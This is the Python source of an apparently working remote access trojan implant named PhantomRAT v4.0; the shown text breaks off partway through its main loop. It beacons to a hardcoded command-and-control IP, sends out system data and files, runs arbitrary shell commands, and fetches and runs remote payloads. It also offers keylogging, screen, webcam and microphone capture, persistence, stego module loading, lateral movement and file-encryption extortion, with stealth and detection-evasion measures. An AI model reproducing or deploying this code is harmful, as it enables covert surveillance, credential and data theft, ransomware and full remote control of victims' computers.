#!/usr/bin/env python3
"""
PhantomRAT Malware Main Entry Point v4.0
Enhanced for performance, stealth, and compatibility with C2 v4.0
Updated with new command handlers and improved beacon system
"""

import sys
import os
import time
import random
import json
import threading
import socket
import logging
import base64
import hashlib
import uuid
import platform
import psutil
from datetime import datetime
import subprocess
import requests
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from phantomrat_modules import (
    execute_module_function as dynamic_execute_module_function,
    list_loaded_modules as dynamic_list_loaded_modules,
    load_module as dynamic_load_module,
)
from phantomrat_readiness import generate_readiness_report

# Configure minimal logging for stealth
logging.getLogger().setLevel(logging.ERROR)

# ==================== PROFILE LOADING & C2 CONFIGURATION v2026 ====================
try:
    with open('malleable_profile.json', 'r') as f:
        profile = json.load(f)
except Exception:
    profile = {}

PROFILE_YEAR = profile.get('profile_year', 2026)

DEFAULT_USER_AGENT = (
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
    'Chrome/110.0.5481.192 Safari/537.36'
)
USER_AGENT = profile.get('security', {}).get('user_agent', DEFAULT_USER_AGENT)

DEFAULT_C2_SERVER = "http://141.105.71.196:8000"  # Your C2 IP
c2_settings = profile.get('c2', {}) if profile else {}
C2_SERVER = c2_settings.get('primary', DEFAULT_C2_SERVER)
C2_FALLBACKS = [entry for entry in c2_settings.get('fallback', []) if entry]
C2_VERIFY_SSL = bool(c2_settings.get('verify_ssl', False))
C2_MASK_HOST = c2_settings.get('mask_host') or None
C2_SNI = c2_settings.get('sni') or None
C2_TIMEOUT = c2_settings.get('connection_timeout', 20)
C2_RETRY = c2_settings.get('retry_attempts', 3)
BEACON_JITTER_MIN = c2_settings.get('beacon_jitter_min', 20)
BEACON_JITTER_MAX = c2_settings.get('beacon_jitter_max', 40)
BEACON_ENDPOINT = c2_settings.get('beacon_endpoint', "/phantom/beacon")
EXFIL_ENDPOINT = c2_settings.get('exfil_endpoint', "/phantom/exfil")
IMPLANT_ID = None
SESSION_ID = str(uuid.uuid4())[:8]  # New session ID for each run

# ==================== ENCRYPTION COMPATIBLE WITH C2 v4.0 ====================
def get_encryption_key():
    """Get encryption key compatible with C2 v4.0"""
    env_key = os.environ.get("PHANTOM_ENCRYPTION_KEY")
    if env_key:
        return env_key.encode(), "environment"

    try:
        with open('malleable_profile.json', 'r') as f:
            profile = json.load(f)
            key = profile.get('encryption', {}).get('key')
            if key:
                return str(key).encode(), "malleable_profile"
    except:
        pass

    # Default shared key used by the dashboard
    return b"phantomrat_32_char_encryption_key_here", "default"

ENCRYPTION_KEY, ENCRYPTION_SOURCE = get_encryption_key()
KDF_SALT_FILE = os.path.join(os.path.dirname(__file__), 'phantomrat_kdf_salt.bin')
KDF_ITERATIONS = 200_000


def load_kdf_salt():
    env_salt = os.environ.get("PHANTOM_KDF_SALT")
    if env_salt:
        try:
            return bytes.fromhex(env_salt) if all(c in '0123456789abcdefABCDEF' for c in env_salt) else env_salt.encode()
        except Exception:
            pass

    try:
        with open(KDF_SALT_FILE, 'rb') as salt_file:
            data = salt_file.read()
            if data:
                return data
    except Exception:
        pass

    profile_salt = profile.get('encryption', {}).get('salt') if profile else None
    if profile_salt:
        if not isinstance(profile_salt, (bytes, bytearray)):
            profile_salt = str(profile_salt).encode()
        try:
            with open(KDF_SALT_FILE, 'wb') as salt_file:
                salt_file.write(profile_salt)
        except Exception:
            pass
        return profile_salt

    generated_salt = os.urandom(32)
    try:
        with open(KDF_SALT_FILE, 'wb') as salt_file:
            salt_file.write(generated_salt)
    except Exception:
        pass
    return generated_salt


PROFILE_SALT = load_kdf_salt()
PROFILE_ITERATIONS = profile.get('encryption', {}).get('iterations', KDF_ITERATIONS) if profile else KDF_ITERATIONS
try:
    PROFILE_ITERATIONS = int(PROFILE_ITERATIONS)
except (TypeError, ValueError):
    PROFILE_ITERATIONS = KDF_ITERATIONS


def derive_fernet_key(secret: bytes) -> bytes:
    """Derive a Fernet-compatible key using PBKDF2-HMAC-SHA256."""
    if not isinstance(secret, (bytes, bytearray)):
        secret = str(secret).encode()

    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=PROFILE_SALT,
        iterations=PROFILE_ITERATIONS,
    )
    return base64.urlsafe_b64encode(kdf.derive(secret))

def build_readiness_context():
    salt_value = PROFILE_SALT.hex() if isinstance(PROFILE_SALT, (bytes, bytearray)) else PROFILE_SALT
    return {
        'c2_server': C2_SERVER,
        'c2_fallbacks': C2_FALLBACKS,
        'beacon_endpoint': BEACON_ENDPOINT,
        'exfil_endpoint': EXFIL_ENDPOINT,
        'user_agent': USER_AGENT,
        'profile_source': 'malleable_profile' if 'profile' in globals() else 'default',
        'profile_year': PROFILE_YEAR,
        'encryption_source': ENCRYPTION_SOURCE,
        'encryption_key': ENCRYPTION_KEY,
        'kdf_salt': salt_value,
        'kdf_iterations': PROFILE_ITERATIONS,
        'mask_host': C2_MASK_HOST,
        'verify_ssl': C2_VERIFY_SSL,
    }


# Encryption class compatible with C2 v4.0
class PhantomEncryption:
    def __init__(self, key):
        from cryptography.fernet import Fernet
        import base64

        if isinstance(key, str):
            key = key.encode()

        # Normalize key length and derive the same Fernet material used by C2
        fernet_key = derive_fernet_key(key)
        self.fernet = Fernet(fernet_key)
    
    def encrypt(self, data):
        """Encrypt data for C2 v4.0"""
        if isinstance(data, dict):
            data = json.dumps(data, separators=(',', ':'))  # Compact JSON
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        try:
            encrypted = self.fernet.encrypt(data)
            return encrypted.decode('utf-8')
        except Exception as e:
            print(f"[!] Encryption error: {e}")
            return base64.b64encode(data).decode('utf-8')  # Fallback
    
    def decrypt(self, encrypted_data):
        """Decrypt data from C2 v4.0"""
        try:
            if isinstance(encrypted_data, str):
                encrypted_data = encrypted_data.encode('utf-8')
            
            decrypted = self.fernet.decrypt(encrypted_data).decode('utf-8')
            
            # Try to parse as JSON
            try:
                return json.loads(decrypted)
            except:
                return decrypted
        except Exception as e:
            print(f"[!] Decryption error: {e}")
            # Try base64 fallback
            try:
                return base64.b64decode(encrypted_data).decode('utf-8')
            except:
                return None

# Initialize encryption
encryption = PhantomEncryption(ENCRYPTION_KEY)

# ==================== MODULE IMPORTS WITH ERROR HANDLING ====================
GUI_MODULES_AVAILABLE = False
keylogger = None

print(f"[*] PhantomRAT v4.0 Implant Initializing...")
print(f"[*] Session ID: {SESSION_ID}")

# Try to import GUI modules
try:
    from phantomrat_keylogger import Keylogger
    from phantomrat_screencap import capture_screen
    from phantomrat_webcam import capture_webcam
    from phantomrat_mic import record_audio
    GUI_MODULES_AVAILABLE = True
    print("[+] GUI modules loaded")
except ImportError as e:
    print(f"[-] GUI modules not available: {e}")
    print("[*] Running in headless mode")

# Try to import enhanced system info
try:
    from phantomrat_sysinfo import EnhancedSystemInfo
    SYSINFO_AVAILABLE = True
    system_info = EnhancedSystemInfo()
    print("[+] Enhanced system info module loaded")
except ImportError as e:
    print(f"[-] Enhanced system info not available: {e}")
    SYSINFO_AVAILABLE = False

# Dynamic module loader
MODULES = {}
def load_module(module_name, class_name=None):
    """Dynamically load a module with error handling"""
    try:
        if module_name in sys.modules:
            module = sys.modules[module_name]
        else:
            module = __import__(module_name)
        
        if class_name:
            return getattr(module, class_name)
        return module
    except ImportError:
        MODULES[module_name] = None
        return None

# Load all available modules
MODULES['process'] = load_module('phantomrat_process')
MODULES['privilege'] = load_module('phantomrat_privilege')
MODULES['fileops'] = load_module('phantomrat_fileops')
MODULES['browser'] = load_module('phantomrat_browser')
MODULES['persistence'] = load_module('phantomrat_persistence')
MODULES['survival'] = load_module('phantomrat_survival')
MODULES['network'] = load_module('phantomrat_network')

print(f"[+] Loaded {sum(1 for m in MODULES.values() if m)}/{len(MODULES)} modules")

# ==================== ENHANCED SYSTEM INFO ====================
def get_comprehensive_system_info():
    """Get comprehensive system information for C2 dashboard"""
    try:
        # Network interfaces
        interfaces = []
        try:
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        interfaces.append({
                            'interface': interface,
                            'ip': addr.address,
                            'netmask': addr.netmask
                        })
        except:
            pass
        
        # Running processes (top 5 by CPU)
        processes = []
        try:
            for proc in sorted(psutil.process_iter(['pid', 'name', 'cpu_percent']), 
                              key=lambda p: p.info['cpu_percent'] or 0, reverse=True)[:5]:
                processes.append({
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'cpu': proc.info['cpu_percent']
                })
        except:
            pass
        
        # Disk usage
        disks = []
        try:
            for partition in psutil.disk_partitions():
                usage = psutil.disk_usage(partition.mountpoint)
                disks.append({
                    'device': partition.device,
                    'mountpoint': partition.mountpoint,
                    'total_gb': round(usage.total / (1024**3), 2),
                    'used_gb': round(usage.used / (1024**3), 2),
                    'free_gb': round(usage.free / (1024**3), 2),
                    'percent': usage.percent
                })
        except:
            pass
        
        info = {
            'id': IMPLANT_ID or 'UNREGISTERED',
            'session_id': SESSION_ID,
            'os': platform.system(),
            'os_version': platform.version(),
            'hostname': socket.gethostname(),
            'ip': socket.gethostbyname(socket.gethostname()),
            'username': os.getenv('USER', os.getenv('USERNAME', 'unknown')),
            'architecture': platform.machine(),
            'cpu_count': psutil.cpu_count(logical=True),
            'cpu_physical_count': psutil.cpu_count(logical=False),
            'memory_total_gb': round(psutil.virtual_memory().total / (1024**3), 2),
            'memory_available_gb': round(psutil.virtual_memory().available / (1024**3), 2),
            'memory_percent': psutil.virtual_memory().percent,
            'boot_time': datetime.fromtimestamp(psutil.boot_time()).isoformat(),
            'uptime_days': round((time.time() - psutil.boot_time()) / 86400, 2),
            'python_version': platform.python_version(),
            'current_dir': os.getcwd(),
            'interfaces': interfaces,
            'top_processes': processes,
            'disks': disks,
            'timestamp': datetime.now().isoformat(),
            'has_gui': GUI_MODULES_AVAILABLE,
            'has_enhanced_info': SYSINFO_AVAILABLE,
            'last_seen': time.time()
        }
        
        # Add GPU info if available
        try:
            import GPUtil
            gpus = GPUtil.getGPUs()
            if gpus:
                info['gpu'] = {
                    'name': gpus[0].name,
                    'load': gpus[0].load,
                    'memory_total': gpus[0].memoryTotal,
                    'memory_free': gpus[0].memoryFree
                }
        except:
            pass
        
        return info
    except Exception as e:
        print(f"[!] Error getting system info: {e}")
        return get_basic_system_info()

def get_basic_system_info():
    """Fallback basic system info"""
    return {
        'id': IMPLANT_ID or 'UNREGISTERED',
        'hostname': socket.gethostname(),
        'os': platform.system(),
        'ip': socket.gethostbyname(socket.gethostname()),
        'timestamp': datetime.now().isoformat(),
        'last_seen': time.time()
    }

# ==================== C2 COMMUNICATION v2026 ====================
def send_to_c2(endpoint, data, method='POST', retry=None):
    """Send encrypted data to C2 server v2026 with masking support."""
    import requests

    global IMPLANT_ID

    # Generate implant ID if not set
    if not IMPLANT_ID:
        host_hash = hashlib.sha256(socket.gethostname().encode()).hexdigest()[:12]
        IMPLANT_ID = f"PHANTOM-{host_hash.upper()}"

    headers = {
        'User-Agent': USER_AGENT,
        'X-Phantom-ID': IMPLANT_ID,
        'X-Phantom-Session': SESSION_ID,
        'X-Phantom-Version': '4.0',
        'Content-Type': 'application/octet-stream'
    }

    if C2_MASK_HOST:
        headers['Host'] = C2_MASK_HOST
    if C2_SNI:
        headers['X-Phantom-SNI'] = C2_SNI

    attempts_allowed = retry if retry is not None else C2_RETRY
    server_candidates = [C2_SERVER] + [fallback for fallback in C2_FALLBACKS if fallback != C2_SERVER]

    for server in server_candidates:
        for attempt in range(attempts_allowed):
            try:
                payload = {
                    'id': IMPLANT_ID,
                    'data': data,
                    'timestamp': time.time(),
                    'session': SESSION_ID,
                    'attempt': attempt + 1
                }

                encrypted_data = encryption.encrypt(payload)

                url = f"{server}{endpoint}"

                if method.upper() == 'POST':
                    response = requests.post(
                        url,
                        data=encrypted_data,
                        headers=headers,
                        timeout=C2_TIMEOUT,
                        verify=C2_VERIFY_SSL
                    )
                else:
                    response = requests.get(
                        url,
                        headers=headers,
                        timeout=C2_TIMEOUT,
                        verify=C2_VERIFY_SSL
                    )

                if response.status_code == 200:
                    if endpoint == BEACON_ENDPOINT:
                        try:
                            decrypted = encryption.decrypt(response.content)
                            return decrypted
                        except Exception:
                            try:
                                return json.loads(response.text)
                            except Exception:
                                return {'tasks': []}
                    return {'status': 'success', 'code': response.status_code}
                if response.status_code in [404, 403]:
                    print(f"[!] C2 endpoint not found or forbidden: {endpoint}")
                    break

                print(f"[!] C2 responded with code: {response.status_code}")
                if attempt < attempts_allowed - 1:
                    time.sleep(2 ** attempt)

            except requests.exceptions.ConnectionError:
                print(f"[!] Connection failed (attempt {attempt + 1}/{attempts_allowed}) to {server}")
                if attempt < attempts_allowed - 1:
                    time.sleep(3 * (attempt + 1))
            except requests.exceptions.Timeout:
                print(f"[!] Request timeout (attempt {attempt + 1}/{attempts_allowed}) to {server}")
                if attempt < attempts_allowed - 1:
                    time.sleep(2 * (attempt + 1))
            except Exception as e:
                print(f"[!] Request error: {e}")
                if attempt < attempts_allowed - 1:
                    time.sleep(2)

    return {'status': 'failed', 'error': 'All retries exhausted'}

def beacon_checkin():
    """Check in with C2 v4.0 and get tasks"""
    system_info = get_comprehensive_system_info()
    
    beacon_data = {
        'id': IMPLANT_ID,
        'os': system_info.get('os'),
        'hostname': system_info.get('hostname'),
        'ip': system_info.get('ip'),
        'status': 'active',
        'capabilities': {
            'gui': GUI_MODULES_AVAILABLE,
            'keylogger': GUI_MODULES_AVAILABLE,
            'screenshot': GUI_MODULES_AVAILABLE,
            'webcam': GUI_MODULES_AVAILABLE,
            'audio': GUI_MODULES_AVAILABLE
        },
        'timestamp': time.time()
    }
    
    result = send_to_c2(BEACON_ENDPOINT, beacon_data)
    
    if result and isinstance(result, dict):
        if 'tasks' in result:
            return result['tasks']
        elif 'status' in result and result['status'] == 'success':
            return []
    
    return []

def exfil_data(data, task_id=None):
    """Exfiltrate data to C2 v4.0"""
    exfil_payload = {
        'id': IMPLANT_ID,
        'data': data,
        'timestamp': time.time()
    }
    
    if task_id:
        exfil_payload['task_id'] = task_id
    
    return send_to_c2(EXFIL_ENDPOINT, exfil_payload)

# ==================== ENHANCED COMMAND HANDLERS ====================
def execute_shell_command(cmd, timeout=30):
    """Execute shell command with timeout"""
    try:
        # Parse command and arguments
        if isinstance(cmd, str):
            import shlex
            args = shlex.split(cmd)
        else:
            args = cmd
        
        # Execute with timeout
        process = subprocess.run(
            args,
            capture_output=True,
            text=True,
            timeout=timeout,
            shell=False if isinstance(cmd, list) else True
        )
        
        return {
            'success': process.returncode == 0,
            'returncode': process.returncode,
            'stdout': process.stdout,
            'stderr': process.stderr,
            'command': cmd
        }
    except subprocess.TimeoutExpired:
        return {
            'success': False,
            'error': f'Command timed out after {timeout} seconds',
            'command': cmd
        }
    except Exception as e:
        return {
            'success': False,
            'error': str(e),
            'command': cmd
        }

def take_screenshot():
    """Take screenshot if GUI modules available"""
    if not GUI_MODULES_AVAILABLE:
        return {'error': 'GUI modules not available'}
    
    try:
        screenshot_data = capture_screen()
        if screenshot_data:
            # For transmission, encode as base64
            screenshot_b64 = base64.b64encode(screenshot_data).decode('utf-8')
            return {
                'success': True,
                'size': len(screenshot_data),
                'format': 'png',
                'preview': screenshot_b64[:100] + '...' if len(screenshot_b64) > 100 else screenshot_b64
            }
        return {'error': 'Failed to capture screenshot'}
    except Exception as e:
        return {'error': str(e)}

def start_keylogger():
    """Start keylogging"""
    global keylogger
    if not GUI_MODULES_AVAILABLE:
        return {'error': 'GUI modules not available'}
    
    try:
        if keylogger is None:
            keylogger = Keylogger()
        keylogger.start()
        return {'success': True, 'message': 'Keylogger started'}
    except Exception as e:
        return {'error': str(e)}

def stop_keylogger():
    """Stop keylogging and get logs"""
    global keylogger
    if keylogger is None:
        return {'error': 'Keylogger not running'}
    
    try:
        logs = keylogger.stop()
        return {
            'success': True,
            'logs': logs[-5000:],  # Last 5000 characters
            'total_size': len(logs)
        }
    except Exception as e:
        return {'error': str(e)}

def list_files(directory='.', max_files=100):
    """List files in directory"""
    try:
        files = []
        total_size = 0
        
        for item in os.listdir(directory):
            item_path = os.path.join(directory, item)
            try:
                stat = os.stat(item_path)
                files.append({
                    'name': item,
                    'size': stat.st_size,
                    'modified': stat.st_mtime,
                    'is_dir': os.path.isdir(item_path)
                })
                total_size += stat.st_size
                
                if len(files) >= max_files:
                    break
            except:
                continue
        
        return {
            'success': True,
            'directory': directory,
            'files': files,
            'count': len(files),
            'total_size': total_size
        }
    except Exception as e:
        return {'error': str(e)}

def download_file(filepath, chunk_size=8192):
    """Download file in chunks for transmission"""
    if not os.path.exists(filepath):
        return {'error': 'File not found'}
    
    try:
        file_size = os.path.getsize(filepath)
        
        # For small files, read entire content
        if file_size <= 1024 * 1024:  # 1MB limit
            with open(filepath, 'rb') as f:
                content = f.read()
            
            return {
                'success': True,
                'filename': os.path.basename(filepath),
                'size': file_size,
                'content': base64.b64encode(content).decode('utf-8')
            }
        else:
            # For large files, send metadata only
            return {
                'success': False,
                'error': f'File too large ({file_size} bytes). Use chunked download.',
                'filename': os.path.basename(filepath),
                'size': file_size
            }
    except Exception as e:
        return {'error': str(e)}


def parse_task_arguments(args):
    """Normalize task arguments into a dictionary."""
    if isinstance(args, dict):
        return args

    if isinstance(args, str) and args.strip():
        try:
            return json.loads(args)
        except Exception:
            return {'value': args}

    return {}


MODULE_WHITELIST = {}
if 'profile' in globals():
    MODULE_WHITELIST = profile.get('modules', {}).get('whitelist', {}) or {}
if not MODULE_WHITELIST:
    MODULE_WHITELIST = {
        'phantomrat_lateral': ['scan_network', 'propagate', 'exec_ssh', 'exec_smb', 'exec_winrm'],
        'phantomrat_extortion': ['encrypt_files', 'decrypt_files', 'exfiltrate_data', 'status'],
        'phantomrat_modules': ['load_remote_module', 'list_cached_modules', 'evict_cache'],
    }


def _is_primitive(value):
    return isinstance(value, (str, int, float, bool)) or value is None


def _validate_value(value, depth=0, max_depth=2):
    if depth > max_depth:
        return False
    if _is_primitive(value):
        return True
    if isinstance(value, (list, tuple)):
        if len(value) > 25:
            return False
        return all(_validate_value(v, depth + 1, max_depth) for v in value)
    if isinstance(value, dict):
        if len(value) > 25:
            return False
        for k, v in value.items():
            if not isinstance(k, str) or k.startswith('__'):
                return False
            if k.lower() in {'globals', 'locals', 'cls', 'func', 'func_code', 'code'}:
                return False
            if not _validate_value(v, depth + 1, max_depth):
                return False
        return True
    return False


def validate_module_call(module_name, function_name, function_args, function_kwargs):
    allowed_functions = MODULE_WHITELIST.get(module_name)
    if not allowed_functions:
        raise ValueError('Module not whitelisted for dynamic execution')

    if allowed_functions != ['*'] and function_name not in allowed_functions:
        raise ValueError('Function not permitted for this module')

    if not isinstance(function_args, (list, tuple)):
        raise ValueError('Positional args must be a list or tuple')

    if not isinstance(function_kwargs, dict):
        raise ValueError('Keyword args must be provided as a dict')

    if len(function_args) > 10:
        raise ValueError('Too many positional arguments')

    if len(function_kwargs) > 25:
        raise ValueError('Too many keyword arguments')

    if not _validate_value(function_args):
        raise ValueError('Invalid positional argument types')

    if not _validate_value(function_kwargs):
        raise ValueError('Invalid keyword argument types')

    return True


def deploy_payload(payload_spec):
    """Download or stage a payload and optionally execute it."""
    spec = parse_task_arguments(payload_spec)

    url = spec.get('url')
    inline_content = spec.get('content')
    destination = spec.get('destination')
    if not destination:
        import tempfile
        destination = tempfile.mktemp(prefix='phantom_', dir=tempfile.gettempdir())
    execute_now = bool(spec.get('execute', False))
    interpreter = spec.get('interpreter')
    mode = spec.get('mode', 'binary')
    expected_hash = spec.get('sha256')  # Integrity check

    if not url and not inline_content:
        return {'success': False, 'error': 'No payload source provided (url or content)'}

    try:
        if url:
            headers = {'User-Agent': USER_AGENT}
            response = requests.get(url, headers=headers, timeout=25, verify=spec.get('verify_ssl', True))
            response.raise_for_status()
            payload_data = response.content
            source = url
        else:
            payload_data = base64.b64decode(inline_content)
            source = 'inline'

        # Verify payload integrity if hash provided
        if expected_hash:
            actual_hash = hashlib.sha256(payload_data).hexdigest()
            if actual_hash != expected_hash:
                return {'success': False, 'error': 'Payload integrity check failed'}

        os.makedirs(os.path.dirname(destination) or '.', exist_ok=True)
        with open(destination, 'wb') as f:
            f.write(payload_data)

        result = {
            'success': True,
            'destination': destination,
            'size': len(payload_data),
            'source': source,
        }

        if execute_now:
            if interpreter:
                exec_cmd = [interpreter, destination]
            elif mode == 'python':
                exec_cmd = [sys.executable, destination]
            else:
                exec_cmd = [destination]

            try:
                proc = subprocess.run(
                    exec_cmd,
                    capture_output=True,
                    text=True,
                    timeout=60,
                )
                result['execution'] = {
                    'command': exec_cmd,
                    'returncode': proc.returncode,
                    'stdout': proc.stdout[-2048:],
                    'stderr': proc.stderr[-2048:],
                }
                result['success'] = proc.returncode == 0
            except Exception as exec_err:
                result['execution'] = {'error': str(exec_err)}
                result['success'] = False

        return result
    except Exception as e:
        return {'success': False, 'error': str(e)}


def load_dynamic_module(module_args):
    """Load a Phantom module from the C2, local path, or stego source."""
    args = parse_task_arguments(module_args)
    module_name = args.get('name') or args.get('module') or args.get('value')
    source = args.get('source', 'remote')
    kwargs = {}

    if not module_name:
        return {'success': False, 'error': 'No module name provided'}

    if source == 'local':
        kwargs['filepath'] = args.get('path') or args.get('filepath')
    elif source == 'stego':
        kwargs['image_path'] = args.get('image') or args.get('image_path')
        kwargs['method'] = args.get('method', 'lsb')

    loaded = dynamic_load_module(module_name, source=source, **kwargs)

    return {
        'success': loaded is not None,
        'module': module_name,
        'source': source,
        'loaded': bool(loaded),
        'loaded_modules': dynamic_list_loaded_modules(),
    }


def execute_dynamic_module(call_args):
    """Execute a function from a previously loaded Phantom module."""
    args = parse_task_arguments(call_args)
    module_name = args.get('module') or args.get('name') or args.get('value')
    function_name = args.get('function') or args.get('func')
    function_args = args.get('args', [])
    function_kwargs = args.get('kwargs', {})

    if not module_name or not function_name:
        return {'success': False, 'error': 'module and function required'}

    try:
        validate_module_call(module_name, function_name, function_args, function_kwargs)
        result = dynamic_execute_module_function(module_name, function_name, *function_args, **function_kwargs)
        return {
            'success': True,
            'module': module_name,
            'function': function_name,
            'result': result,
        }
    except Exception as e:
        return {'success': False, 'error': str(e), 'module': module_name, 'function': function_name}

def handle_command_v4(task):
    """Handle C2 v4.0 commands with improved error handling"""
    if not task or 'command' not in task:
        return {'error': 'Invalid task format', 'success': False}
    
    cmd = task['command']
    args = task.get('arguments', '')
    task_id = task.get('id')
    
    print(f"[*] Executing: {cmd} {args if args else ''}")
    
    result = {
        'command': cmd,
        'task_id': task_id,
        'implant_id': IMPLANT_ID,
        'session_id': SESSION_ID,
        'timestamp': time.time(),
        'success': False,
        'output': None
    }
    
    try:
        # ========== SYSTEM COMMANDS ==========
        if cmd == 'sysinfo':
            result['output'] = get_comprehensive_system_info()
            result['success'] = True

        elif cmd == 'readiness_report':
            result['output'] = generate_readiness_report(build_readiness_context())
            result['success'] = True

        elif cmd == 'ping':
            result['output'] = {
                'message': 'pong',
                'implant_id': IMPLANT_ID,
                'session_id': SESSION_ID,
                'time': time.time()
            }
            result['success'] = True
            
        elif cmd == 'get_id':
            result['output'] = {
                'implant_id': IMPLANT_ID,
                'session_id': SESSION_ID,
                'hostname': socket.gethostname()
            }
            result['success'] = True
            
        # ========== SHELL COMMANDS ==========
        elif cmd == 'shell':
            shell_result = execute_shell_command(args, timeout=60)
            result['output'] = shell_result
            result['success'] = shell_result.get('success', False)
            
        elif cmd == 'execute':
            result['output'] = execute_shell_command(args, timeout=30)
            result['success'] = result['output'].get('success', False)
            
        # ========== FILE OPERATIONS ==========
        elif cmd == 'ls' or cmd == 'list_files':
            directory = args if args else '.'
            result['output'] = list_files(directory)
            result['success'] = result['output'].get('success', False)
            
        elif cmd == 'download':
            if args:
                result['output'] = download_file(args)
                result['success'] = result['output'].get('success', False)
            else:
                result['output'] = {'error': 'No file specified'}

        # ========== PAYLOAD DEPLOYMENT ==========
        elif cmd == 'deploy_payload':
            result['output'] = deploy_payload(args)
            result['success'] = result['output'].get('success', False)
                
        elif cmd == 'cd':
            if args:
                try:
                    os.chdir(args)
                    result['output'] = {
                        'success': True,
                        'new_dir': os.getcwd()
                    }
                    result['success'] = True
                except Exception as e:
                    result['output'] = {'error': str(e)}
            else:
                result['output'] = {'error': 'No directory specified'}
                
        # ========== GUI COMMANDS ==========
        elif cmd == 'screenshot':
            if GUI_MODULES_AVAILABLE:
                result['output'] = take_screenshot()
                result['success'] = result['output'].get('success', False)
            else:
                result['output'] = {'error': 'GUI modules not available'}
                
        elif cmd == 'keylog_start':
            result['output'] = start_keylogger()
            result['success'] = result['output'].get('success', False)
            
        elif cmd == 'keylog_stop':
            result['output'] = stop_keylogger()
            result['success'] = result['output'].get('success', False)
            
        elif cmd == 'keylog_get':
            if keylogger:
                logs = keylogger.get_logs()
                result['output'] = {
                    'success': True,
                    'logs': logs[-2000:] if logs else '',
                    'size': len(logs) if logs else 0
                }
                result['success'] = True
            else:
                result['output'] = {'error': 'Keylogger not running'}
                
        # ========== PROCESS COMMANDS ==========
        elif cmd == 'ps' or cmd == 'list_processes':
            processes = []
            try:
                for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
                    try:
                        processes.append(proc.info)
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                result['output'] = {
                    'success': True,
                    'processes': processes[:50]  # Limit to 50
                }
                result['success'] = True
            except Exception as e:
                result['output'] = {'error': str(e)}
                
        elif cmd == 'kill':
            if args:
                try:
                    pid = int(args)
                    import signal
                    os.kill(pid, signal.SIGTERM)
                    result['output'] = {'success': True, 'pid': pid}
                    result['success'] = True
                except Exception as e:
                    result['output'] = {'error': str(e)}
            else:
                result['output'] = {'error': 'No PID specified'}
                
        # ========== NETWORK COMMANDS ==========
        elif cmd == 'ifconfig' or cmd == 'ipconfig':
            interfaces = []
            try:
                for interface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET:
                            interfaces.append({
                                'interface': interface,
                                'ip': addr.address,
                                'netmask': addr.netmask
                            })
                result['output'] = {'success': True, 'interfaces': interfaces}
                result['success'] = True
            except Exception as e:
                result['output'] = {'error': str(e)}
                
        elif cmd == 'netstat':
            connections = []
            try:
                for conn in psutil.net_connections(kind='inet'):
                    connections.append({
                        'fd': conn.fd,
                        'family': conn.family,
                        'type': conn.type,
                        'laddr': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                        'raddr': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                        'status': conn.status,
                        'pid': conn.pid
                    })
                result['output'] = {'success': True, 'connections': connections[:100]}
                result['success'] = True
            except Exception as e:
                result['output'] = {'error': str(e)}

        # ========== MODULE CONTROL ==========
        elif cmd == 'load_module':
            result['output'] = load_dynamic_module(args)
            result['success'] = result['output'].get('success', False)

        elif cmd == 'module_call':
            result['output'] = execute_dynamic_module(args)
            result['success'] = result['output'].get('success', False)

        elif cmd == 'list_modules':
            result['output'] = {'success': True, 'modules': dynamic_list_loaded_modules()}
            result['success'] = True
                
        # ========== PERSISTENCE COMMANDS ==========
        elif cmd == 'persist':
            if MODULES['persistence']:
                try:
                    success = MODULES['persistence'].install()
                    result['output'] = {'success': success}
                    result['success'] = success
                except Exception as e:
                    result['output'] = {'error': str(e)}
            else:
                result['output'] = {'error': 'Persistence module not available'}
                
        elif cmd == 'unpersist':
            if MODULES['persistence']:
                try:
                    success = MODULES['persistence'].uninstall()
                    result['output'] = {'success': success}
                    result['success'] = success
                except Exception as e:
                    result['output'] = {'error': str(e)}
            else:
                result['output'] = {'error': 'Persistence module not available'}
                
        # ========== SPECIAL COMMANDS ==========
        elif cmd == 'self_destruct':
            result['output'] = {'message': 'Self-destruct initiated'}
            result['success'] = True
            # Schedule cleanup in separate thread
            threading.Thread(target=self_destruct, daemon=True).start()
            
        elif cmd == 'sleep':
            try:
                seconds = int(args) if args else 30
                result['output'] = {'message': f'Sleeping for {seconds} seconds'}
                result['success'] = True
                time.sleep(seconds)
            except ValueError:
                result['output'] = {'error': 'Invalid sleep duration'}
                
        elif cmd == 'update':
            result['output'] = {'message': 'Update command received (not implemented)'}
            result['success'] = True
            
        # ========== UNKNOWN COMMAND ==========
        else:
            result['output'] = {'error': f'Unknown command: {cmd}'}
            result['success'] = False
            
    except Exception as e:
        result['output'] = {'error': f'Command execution failed: {str(e)}'}
        result['success'] = False
    
    return result

def self_destruct():
    """Clean up and exit"""
    print(f"[*] Self-destruct sequence initiated")
    
    # Stop keylogger if running
    global keylogger
    if keylogger:
        try:
            keylogger.stop()
        except:
            pass
    
    # Send final heartbeat
    try:
        exfil_data({
            'type': 'goodbye',
            'implant_id': IMPLANT_ID,
            'message': 'Self-destruct completed',
            'timestamp': time.time()
        })
    except:
        pass
    
    time.sleep(2)
    print(f"[*] Goodbye!")
    os._exit(0)

# ==================== OBFUSCATED SLEEP ====================
def obfuscated_sleep(base_duration, jitter=0.4):
    """Sleep with random jitter and pattern avoidance"""
    # Add random jitter
    actual_duration = base_duration * random.uniform(1 - jitter, 1 + jitter)
    
    # Split into random intervals
    elapsed = 0
    while elapsed < actual_duration:
        chunk = random.uniform(0.5, min(3.0, actual_duration - elapsed))
        time.sleep(chunk)
        elapsed += chunk
        
        # Random CPU activity to avoid pattern detection
        if random.random() < 0.3:
            _ = sum(i * i for i in range(random.randint(10, 50)))

# ==================== MAIN LOOP v4.0 ====================
def main_loop():
    """Main implant loop for C2 v4.0"""
    print(f"""
    ╔══════════════════════════════════════════════════╗
    ║           PHANTOM RAT IMPLANT v4.0              ║
    ║            C2 Compatible Edition                ║
